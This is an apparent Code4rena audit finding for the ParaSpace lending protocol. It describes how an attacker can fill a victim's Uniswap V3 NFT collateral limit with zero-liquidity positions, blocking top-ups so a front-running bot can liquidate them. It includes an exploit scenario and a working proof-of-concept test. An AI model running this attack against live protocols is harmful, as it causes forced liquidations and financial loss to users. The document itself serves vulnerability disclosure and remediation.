## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- selected for report
- M-10

# [Users can be locked out of providing Uniswap V3 NFTs as collateral](https://github.com/code-423n4/2022-11-paraspace-findings/issues/334) 

# Lines of code

https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L248
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L107


# Vulnerability details

## Impact
A malicious actor can disallow supplying of Uniswap V3 NFT tokens as collateral for any user. This can be exploited as a front-running attack that disallows a borrower to provide more Uniswap V3 LP tokens as collateral and save their collateral from being liquidated.
## Proof of Concept
The protocol allows users to provide Uniswap V3 NFT tokens as collateral. Since these tokens can be minted freely, a malicious actor may provide a huge number of such tokens as collateral and impose high gas consumption by the `calculateUserAccountData` function of `GenericLogic` (which calculates user's collateral and debt value). Potentially, this can lead to out of gas errors during collateral/debt values calculation. To protect against this attack, a limit on the number of Uniswap V3 NFTs a user can provide as collateral was added ([NTokenUniswapV3.sol#L33-L35](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol#L33-L35)):
```solidity
constructor(IPool pool) NToken(pool, true) {
    _ERC721Data.balanceLimit = 30;
}
```
The limit is enforced during Uniswap V3 NToken minting and transferring ([MintableERC721Logic.sol#L247-L248](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L247-L248), [MintableERC721Logic.sol#L106-L107](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L106-L107), [MintableERC721Logic.sol#L402-L414](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L402-L414)):
```solidity
uint64 newBalance = oldBalance + uint64(tokenData.length);
_checkBalanceLimit(erc721Data, ATOMIC_PRICING, newBalance);
```

```solidity
uint64 newRecipientBalance = oldRecipientBalance + 1;
_checkBalanceLimit(erc721Data, ATOMIC_PRICING, newRecipientBalance);
```

```solidity
function _checkBalanceLimit(
    MintableERC721Data storage erc721Data,
    bool ATOMIC_PRICING,
    uint64 balance
) private view {
    if (ATOMIC_PRICING) {
        uint64 balanceLimit = erc721Data.balanceLimit;
        require(
            balanceLimit == 0 || balance <= balanceLimit,
            Errors.NTOKEN_BALANCE_EXCEEDED
        );
    }
}
```

While protecting from the attack mentioned above, this creates a new attack vector: a malicious actor can send many Uniswap V3 NTokens to a victim and lock them out of adding more Uniswap V3 NTokens as collateral. This attack is viable and cheap because *Uniswap V3 NFTs can have 0 liquidity*, thus the attacker would only need to pay transaction fees, which are cheap on L2 networks.

### Exploit Scenario
1. Bob provides Uniswap V3 NFTs as collateral on Paraspace and borrows other tokens.
1. Due to extreme market conditions, Bob's health factor is getting closer to the liquidation threshold.
1. Bob, while being an active liquidity provider on Uniswap, supplies another Uniswap V3 NFT as a collateral.
1. Alice runs liquidation and front-running bots. One of her bots notices that Bob is trying to increase his collateral value with a Uniswap V3 NFT.
1. Alice's bot mints multiple Uniswap V3 NFTs using the same asset tokens by removing all liquidity from tokens after they were minted.
1. Alice's bot supplies the newly minted NFTs on behalf of Bob. Bob's balance of Uniswap V3 NFTs reaches the maximal allowed.
1. Bob's transaction to add another Uniswap V3 NFT as collateral fails due to the balance limit being reached.
1. While Bob is trying to figure out what's happened and before he provides collateral in other tokens or withdraws the empty NTokens, Alice's bot liquidates Bob's debt.

```ts
// paraspace-core/test/_uniswapv3_position_control.spec.ts
it("allows to fill balanceLimit of another user cheaply [AUDIT]", async () => {
  const {
    users: [user1, user2],
    dai,
    weth,
    nftPositionManager,
    nUniswapV3,
    pool
  } = testEnv;

  // user1 has 1 token initially.
  expect(await nUniswapV3.balanceOf(user1.address)).to.eq("1");

  // Set the limit to 5 tokens so the test runs faster.
  let totalTokens = 5;
  await waitForTx(await nUniswapV3.setBalanceLimit(totalTokens));

  const userDaiAmount = await convertToCurrencyDecimals(dai.address, "10000");
  const userWethAmount = await convertToCurrencyDecimals(weth.address, "10");
  await fund({ token: dai, user: user2, amount: userDaiAmount });
  await fund({ token: weth, user: user2, amount: userWethAmount });
  let nft = nftPositionManager.connect(user2.signer);
  await approveTo({ target: nftPositionManager.address, token: dai, user: user2 });
  await approveTo({ target: nftPositionManager.address, token: weth, user: user2 });
  const fee = 3000;
  const tickSpacing = fee / 50;
  const lowerPrice = encodeSqrtRatioX96(1, 10000);
  const upperPrice = encodeSqrtRatioX96(1, 100);
  await nft.setApprovalForAll(nftPositionManager.address, true);
  await nft.setApprovalForAll(pool.address, true);
  const MaxUint128 = DRE.ethers.BigNumber.from(2).pow(128).sub(1);

  let daiAvailable, wethAvailable;

  // user2 is going to mint 4 Uniswap V3 NFTs using the same amount of DAI and WETH.
  // After each mint, user2 removes all liquidity from a token and uses it to mint
  // next token.
  for (let tokenId = 2; tokenId <= totalTokens; tokenId++) {
    daiAvailable = await dai.balanceOf(user2.address);
    wethAvailable = await weth.balanceOf(user2.address);

    await mintNewPosition({
      nft: nft,
      token0: dai,
      token1: weth,
      fee: fee,
      user: user2,
      tickSpacing: tickSpacing,
      lowerPrice,
      upperPrice,
      token0Amount: daiAvailable,
      token1Amount: wethAvailable,
    });

    const liquidity = (await nftPositionManager.positions(tokenId)).liquidity;

    await nft.decreaseLiquidity({
      tokenId: tokenId,
      liquidity: liquidity,
      amount0Min: 0,
      amount1Min: 0,
      deadline: 2659537628,
    });

    await nft.collect({
      tokenId: tokenId,
      recipient: user2.address,
      amount0Max: MaxUint128,
      amount1Max: MaxUint128,
    });

    expect((await nftPositionManager.positions(tokenId)).liquidity).to.eq("0");
  }

  // user2 supplies the 4 UniV3 NFTs to user1.
  const tokenData = Array.from({ length: totalTokens - 1 }, (_, i) => {
    return {
      tokenId: i + 2,
      useAsCollateral: true
    }
  });
  await waitForTx(
    await pool
      .connect(user2.signer)
      .supplyERC721(
        nftPositionManager.address,
        tokenData,
        user1.address,
        0,
        {
          gasLimit: 12_450_000,
        }
      )
  );

  expect(await nUniswapV3.balanceOf(user2.address)).to.eq(0);
  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(totalTokens);

  // user1 tries to supply another UniV3 NFT but fails, since the limit has
  // already been reached.
  await fund({ token: dai, user: user1, amount: userDaiAmount });
  await fund({ token: weth, user: user1, amount: userWethAmount });
  nft = nftPositionManager.connect(user1.signer);
  await mintNewPosition({
    nft: nft,
    token0: dai,
    token1: weth,
    fee: fee,
    user: user1,
    tickSpacing: tickSpacing,
    lowerPrice,
    upperPrice,
    token0Amount: userDaiAmount,
    token1Amount: userWethAmount,
  });

  await expect(
    pool
      .connect(user1.signer)
      .supplyERC721(
        nftPositionManager.address,
        [{ tokenId: totalTokens + 1, useAsCollateral: true }],
        user1.address,
        0,
        {
          gasLimit: 12_450_000,
        }
      )
  ).to.be.revertedWith("120");  //ntoken balance exceed limit.

  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(totalTokens);

  // The cost of the attack was low. user2's balance of DAI and WETH
  // hasn't changed, only the rounding error of Uniswap V3 was subtracted.
  expect(await dai.balanceOf(user2.address)).to.eq("9999999999999999999996");
  expect(await weth.balanceOf(user2.address)).to.eq("9999999999999999996");
});
```
## Tools Used
Manual review
## Recommended Mitigation Steps
Consider disallowing supplying Uniswap V3 NFTs that have 0 liquidity and removing the entire liquidity from tokens that have already been supplied. Setting a minimal required liquidity for a Uniswap V3 NFT will make this attack more costly, however it won't remove the attack vector entirely.